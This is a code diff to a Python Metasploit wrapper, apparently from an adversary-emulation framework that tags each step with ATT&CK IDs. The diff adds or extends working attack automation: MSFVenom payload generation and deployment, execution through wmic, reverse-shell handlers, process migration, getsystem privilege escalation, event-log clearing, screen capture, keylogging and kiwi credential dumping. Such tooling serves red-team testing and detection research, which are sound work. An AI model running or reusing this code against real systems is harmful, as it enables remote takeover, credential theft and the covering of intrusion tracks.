@@ -43,19 +43,25 @@ class Metasploit():
             kwargs["server"] = self.attacker.get_ip()
             time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.
 
-    def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler'):
+    def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler', lhost=None):
         """ Start a metasploit handler and wait for external payload to connect
 
+        @param payload: The payload being used in the implant
+        @param exploit: Normally the generic handler. Overwrite it if you feel lucky
+        @param lhost: the ip of the attack host. Use this to use the attacker ip as seen from the controller.
         @:returns: res, which contains "job_id" and "uuid"
         """
-        exploit = self.get_client().modules.use('exploit', exploit)
+        exp = self.get_client().modules.use('exploit', exploit)
         # print(exploit.description)
         # print(exploit.missing_required)
-        payload = self.get_client().modules.use('payload', payload)
+        pl = self.get_client().modules.use('payload', payload)
         # print(payload.description)
         # print(payload.missing_required)
-        payload["LHOST"] = self.attacker.get_ip()
-        res = exploit.execute(payload=payload)
+        if lhost is None:
+            lhost = self.attacker.get_ip()
+        pl["LHOST"] = lhost
+        print(f"Creating stub for external payload Exploit: {exploit} Payload: {payload}, lhost: {lhost}")
+        res = exp.execute(payload=pl)
         print(res)
         return res
 
@@ -104,7 +110,7 @@ class Metasploit():
 
         while self.get_client().sessions.list == {}:
             time.sleep(1)
-            print(f"Waiting to get any session {retries}")
+            print(f"Metasploit waiting to get any session {retries}")
             retries -= 1
             if retries <= 0:
                 raise MetasploitError("Can not find any session")
@@ -191,34 +197,30 @@ class Metasploit():
 
         return res
 
-    def smart_infect(self, target, payload_type="windows/x64/meterpreter/reverse_https", payload_name="babymetal.exe"):
+    def smart_infect(self, target, **kwargs):
         """ Checks if a target already has a meterpreter session open. Will deploy a payload if not """
 
         # TODO Smart_infect should detect the platform of the target and pick the proper parameters based on that
 
+        payload_name = kwargs.get("outfile", "babymetal.exe")
+        payload_type = kwargs.get("payload", None)
+        if payload_type is None:
+            raise MetasploitError("Payload not defined")
         try:
-            self.start_exploit_stub_for_external_payload(payload=payload_type)
+            self.start_exploit_stub_for_external_payload(payload_type, lhost=kwargs.get("lhost", None))
             self.wait_for_session(2)
         except MetasploitError:
 
             self.attack_logger.vprint(
-                f"{CommandlineColors.OKCYAN}Create payload {payload_name} replacement{CommandlineColors.ENDC}",
+                f"{CommandlineColors.OKCYAN}Create payload {payload_name} {CommandlineColors.ENDC}",
                 1)
             venom = MSFVenom(self.attacker, target, self.attack_logger)
-            venom.generate_and_deploy(payload=payload_type,
-                                      architecture="x86",
-                                      platform="windows",
-                                      lhost=self.attacker.get_ip(),
-                                      format="exe",
-                                      outfile=payload_name,
-                                      encoder="x86/shikata_ga_nai",
-                                      iterations=5
-                                      )
+            venom.generate_and_deploy(**kwargs)
             self.attack_logger.vprint(
-                f"{CommandlineColors.OKCYAN}Execute {payload_name} replacement - waiting for meterpreter shell{CommandlineColors.ENDC}",
+                f"{CommandlineColors.OKCYAN}Execute {payload_name} - waiting for meterpreter shell{CommandlineColors.ENDC}",
                 1)
 
-            self.start_exploit_stub_for_external_payload(payload=payload_type)
+            self.start_exploit_stub_for_external_payload(payload=payload_type, lhost=kwargs.get("lhost", None))
             self.wait_for_session()
 
 ##########################################################################
@@ -276,6 +278,7 @@ class MSFVenom():
             cmd += f" -e {encoder}"
         if iterations is not None:
             cmd += f" -i {iterations}"
+        cmd += " SessionRetryWait=1 "
 
         # Detecting all the mistakes that already have been made. To be continued
         # Check if encoder supports the architecture
@@ -294,6 +297,7 @@ class MSFVenom():
 
         # Footnote: Currently we only support windows/linux and the "boring" payloads. This will be more tricky as soon as we get creative here
 
+        print(f"MSFVenom: {cmd}")
         self.attacker.remote_run(cmd)
 
     def generate_and_deploy(self, **kwargs):
@@ -327,8 +331,7 @@ class MSFVenom():
                 cmd = ""
             cmd += f"chmod +x {payload_name}; ./{payload_name}"
         if self.target.get_os() == "windows":
-            cmd = f'{payload_name}'
-
+            cmd = f'wmic process call create "%homepath%\\{payload_name}",""'
         print(cmd)
 
         if self.attack_logger:
@@ -431,7 +434,8 @@ class MetasploitInstant(Metasploit):
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
-                                                  logid=logid)
+                                                  logid=logid,
+                                                  result=res)
         return res
 
     def migrate(self, target, user=None, name=None, arch=None):
@@ -443,6 +447,9 @@ class MetasploitInstant(Metasploit):
         """
 
         ttp = "T1055"
+        tactics = "Privilege Escalation"
+        tactics_id = "TA0004"
+        description = "Migrating to another process can escalate privileges, move the meterpreter to a long running process or evade detection. For that the Meterpreter stub is injected into another process and the new stub then connects to the Metasploit server instead of the old one."
 
         process_list = self.ps_process_discovery(target)
         ps = self.parse_ps(process_list[0])
@@ -456,16 +463,22 @@ class MetasploitInstant(Metasploit):
         target_process = random.choice(filtered_list)
         print(f"Migrating to process {target_process}")
         command = f"migrate {target_process['PID']}"
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
-        res = self.meterpreter_execute_on([command], target)
-        print(res)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           name="migrate",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           ttp=ttp)
+        res = self.meterpreter_execute_on([command], target, delay=5)
+        print(f"Result of migrate {res}")
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
-                                                  ttp=ttp)
+                                                  ttp=ttp,
+                                                  result=res,
+                                                  logid=logid)
         return res
 
     def arp_network_discovery(self, target, **kwargs):
@@ -498,7 +511,8 @@ class MetasploitInstant(Metasploit):
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
-                                                  logid=logid)
+                                                  logid=logid,
+                                                  result=res)
         return res
 
     def nslookup(self, target, target2, **kwargs):
@@ -535,22 +549,31 @@ class MetasploitInstant(Metasploit):
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
-                                                  logid=logid)
+                                                  logid=logid,
+                                                  result=res)
         return res
 
-    def getsystem(self, target, **kwargs):
-        """ Do a network discovery on the target """
+    def getsystem(self, target, variant=0, **kwargs):
+        """ Do a network discovery on the target
+
+        @param target: Target to attack
+        @param variant: Variant of getsystem to use. 0 is auto, max is 3
+        """
 
         command = "getsystem"
         ttp = "????"   # It uses one out of three different ways to elevate privileges.
         tactics = "Privilege Escalation"
         tactics_id = "TA0004"
         description = """
-Elevate privileges from local administrator to SYSTEM. Three ways to do that will be tried:
-* named pipe impersonation using cmd
-* named pipe impersonation using a dll
-* token duplication
+Elevate privileges from local administrator to SYSTEM. Three ways to do that will be tried:\n
+0) auto \n
+1) named pipe impersonation using cmd \n
+2) named pipe impersonation using a dll \n
+3) token duplication\n
 """
+
+        if variant != 0:
+            command += f" -t {variant}"
         # https://docs.rapid7.com/metasploit/meterpreter-getsystem/
 
         self.attack_logger.vprint(
@@ -573,31 +596,45 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
-                                                  logid=logid)
+                                                  logid=logid,
+                                                  result=res)
         return res
 
-    def clearev(self, target):
+    def clearev(self, target, **kwargs):
         """ Clears windows event logs """
 
         command = "clearev"
         ttp = "T1070.001"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Defense Evasion"
+        tactics_id = "TA0005"
+        description = """
+Clear windows event logs to hide tracks
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="clearev",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
         print(res)
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
-                                                  ttp=ttp)
+                                                  ttp=ttp,
+                                                  logid=logid,
+                                                  result=res)
         return res
 
-    def screengrab(self, target):
+    def screengrab(self, target, **kwargs):
         """ Creates a screenshot
 
         Before using it, migrate to a process running while you want to monitor.
@@ -606,14 +643,25 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
 
         command = "screengrab"
         ttp = "T1113"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Collection"
+        tactics_id = "TA0009"
+        description = """
+Do screen grabbing to collect data on target
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="screengrab",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on(["use espia"], target)
         print(res)
         res = self.meterpreter_execute_on([command], target)
@@ -621,10 +669,12 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
-                                                  ttp=ttp)
+                                                  ttp=ttp,
+                                                  logid=logid,
+                                                  result=res)
         return res
 
-    def keylogging(self, target, monitoring_time):
+    def keylogging(self, target, monitoring_time, **kwargs):
         """ Starts keylogging
 
         Before using it, migrate to a process running while you want to monitor.
@@ -632,19 +682,29 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
         "winlogon.exe" will monitor user logins. "explorer.exe" during the session.
 
         @param monitoring_time: Seconds the keylogger is running
-        @param monitoring_time: The time to monitor the keys. In seconds
         """
 
         command = "keyscan_start"
         ttp = "T1056.001"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Collection"
+        tactics_id = "TA0009"
+        description = """
+Log keys to get passwords and other credentials
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="keylogging",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
         print(res)
         time.sleep(monitoring_time)
@@ -653,53 +713,82 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
-                                                  ttp=ttp)
+                                                  ttp=ttp,
+                                                  logid=logid,
+                                                  result=res)
         return res
 
-    def getuid(self, target):
+    def getuid(self, target, **kwargs):
         """ Returns the UID
 
         """
 
         command = "getuid"
         ttp = "T1056.001"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Collection"
+        tactics_id = "TA0009"
+        description = """
+Get user id
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="getuid",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
 
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
-                                                  ttp=ttp)
+                                                  ttp=ttp,
+                                                  logid=logid,
+                                                  result=res)
+
         return res[0]
 
-    def sysinfo(self, target):
+    def sysinfo(self, target, **kwargs):
         """ Returns the sysinfo
 
         """
 
         command = "sysinfo"
         ttp = "T1082"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Discovery"
+        tactics_id = "TA0007"
+        description = """
+Get basic system information
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="sysinfo",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
 
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
-                                                  ttp=ttp)
+                                                  ttp=ttp,
+                                                  logid=logid,
+                                                  result=res)
         return res[0]
 
     def upload(self, target, src, dst, **kwargs):
@@ -738,5 +827,62 @@ Uploading new files to the target. Can be config files, tools, implants, ...
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
-                                                  logid=logid)
+                                                  logid=logid,
+                                                  result=res)
+        return res
+
+    def kiwi(self, target, variant="creds_all", **kwargs):
+        """ Kiwi is the modern equivalent to mimikatz
+
+        @param target: target being attacked
+        @param variant: kiwi command being used
+        """
+
+        ttp = "t1003"
+        tactics = "Credential access"
+        tactics_id = "TA0006"
+        description = """
+Accessing user credentials in memory
+"""
+
+        res = []
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Preparing for Kiwi{CommandlineColors.ENDC}", 1)
+
+        # We need system privileges
+        self.getsystem(target, 0, **kwargs)
+
+        # Kiwi needs to be loaded
+        command = "load kiwi "
+        res += self.meterpreter_execute_on([command], target, kwargs.get("delay", 10))
+
+        # Executing kiwi
+        command = f"{variant} "
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="kiwi",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description",
+                                                                                            None),
+                                                           countermeasure=kwargs.get("countermeasure", None)
+                                                           )
+        res += self.meterpreter_execute_on([command], target, kwargs.get("delay", 10))
+
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp,
+                                                  logid=logid,
+                                                  result=res)
+
+        print(res)
         return res
